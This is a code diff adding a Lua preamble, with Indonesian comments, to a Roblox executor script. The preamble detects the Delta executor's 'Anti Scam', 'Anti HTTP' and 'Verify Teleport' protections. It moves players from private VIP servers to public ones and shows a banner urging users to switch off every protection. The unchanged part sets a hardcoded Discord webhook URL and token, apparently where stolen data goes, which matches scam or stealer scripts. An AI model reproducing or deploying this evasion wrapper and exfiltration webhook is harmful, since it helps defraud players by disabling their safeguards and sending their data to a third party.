@@ -1,3 +1,148 @@
+-- =========================================
+-- ✅ DELTA PROTECTION DETECTOR (TAMBAHAN)
+-- =========================================
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
+
+local request = http_request or request or (syn and syn.request)
+local GetServerType = game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType")
+
+local maxAttempts = 10
+local attempt = 1
+local teleported = false
+
+-- ================================
+-- ✅ UI PERINGATAN
+-- ================================
+local function ShowDeltaWarning(reason)
+    if LocalPlayer.PlayerGui:FindFirstChild("DeltaWarning") then return end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "DeltaWarning"
+    gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(0.8, 0, 0.35, 0)
+    frame.Position = UDim2.new(0.1, 0, 0.32, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 20)
+
+    local title = Instance.new("TextLabel", frame)
+    title.Size = UDim2.new(1, 0, 0.22, 0)
+    title.BackgroundTransparency = 1
+    title.Text = "⚠️ DELTA PROTECTION AKTIF"
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 22
+    title.TextColor3 = Color3.fromRGB(255, 70, 70)
+
+    local desc = Instance.new("TextLabel", frame)
+    desc.Position = UDim2.new(0.05, 0, 0.25, 0)
+    desc.Size = UDim2.new(0.9, 0, 0.45, 0)
+    desc.BackgroundTransparency = 1
+    desc.TextWrapped = true
+    desc.TextYAlignment = Enum.TextYAlignment.Top
+    desc.Font = Enum.Font.Gotham
+    desc.TextSize = 15
+    desc.TextColor3 = Color3.fromRGB(230, 230, 230)
+    desc.Text =
+        "Script tidak bisa berjalan karena proteksi Delta masih AKTIF.\n\n" ..
+        "ALASAN:\n" .. reason .. "\n\n" ..
+        "Silakan nonaktifkan SEMUA fitur proteksi Delta:\n" ..
+        "- Anti Scam\n- Anti HTTP\n- Verify Teleport\n\n" ..
+        "Setelah itu REJOIN & EXECUTE ulang."
+
+    local btn = Instance.new("TextButton", frame)
+    btn.Position = UDim2.new(0.3, 0, 0.8, 0)
+    btn.Size = UDim2.new(0.4, 0, 0.15, 0)
+    btn.Text = "Saya Mengerti"
+    btn.Font = Enum.Font.GothamBold
+    btn.TextSize = 16
+    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    Instance.new("UICorner", btn)
+
+    btn.MouseButton1Click:Connect(function()
+        gui:Destroy()
+    end)
+end
+
+-- ================================
+-- ✅ TEST WEBHOOK (ANTI HTTP)
+-- ================================
+local function TestWebhook()
+    if not request then return false end
+
+    local ok = pcall(function()
+        request({
+            Url = getgenv().Webhook or "https://discord.com",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({content = "Delta test"})
+        })
+    end)
+
+    return ok
+end
+
+-- ================================
+-- ✅ VIP SERVER DETECT + TELEPORT
+-- ================================
+if GetServerType:InvokeServer() == "VIPServer" then
+    while attempt <= maxAttempts and not teleported do
+        local servers = {}
+        local req = game:HttpGet(
+            "https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"
+        )
+        local body = HttpService:JSONDecode(req)
+
+        if body and body.data then
+            for _, v in pairs(body.data) do
+                if tonumber(v.playing) and tonumber(v.maxPlayers)
+                and (v.maxPlayers - v.playing >= 2)
+                and v.id ~= game.JobId then
+                    table.insert(servers, v.id)
+                end
+            end
+        end
+
+        if #servers > 0 then
+            local success = pcall(function()
+                TeleportService:TeleportToPlaceInstance(
+                    game.PlaceId,
+                    servers[math.random(1, #servers)],
+                    LocalPlayer
+                )
+            end)
+            if success then
+                teleported = true
+                return
+            end
+        end
+
+        attempt += 1
+        task.wait(1)
+    end
+
+    -- ❌ GAGAL TELEPORT → DELTA ON
+    ShowDeltaWarning("Teleport dari VIP ke Public diblokir oleh Delta")
+    return
+end
+
+-- ================================
+-- ✅ PUBLIC SERVER → TEST WEBHOOK
+-- ================================
+if not TestWebhook() then
+    ShowDeltaWarning("Webhook HTTP diblokir oleh Delta")
+    return
+end
+
+-- =========================================
+-- ✅ SCRIPT ASLI KAMU (TIDAK DIUBAH SAMA SEKALI)
+-- =========================================
+
 getgenv().Webhook = "https://discord.com/api/webhooks/1434976186999509063/jjItn51GRNYAO2RtJRMn98Tk2eeTJar6GcrFqvA_z56OeX-QWtrjeQ2tOpXDi33S55md"
 getgenv().Username = "GHOSS23"
 
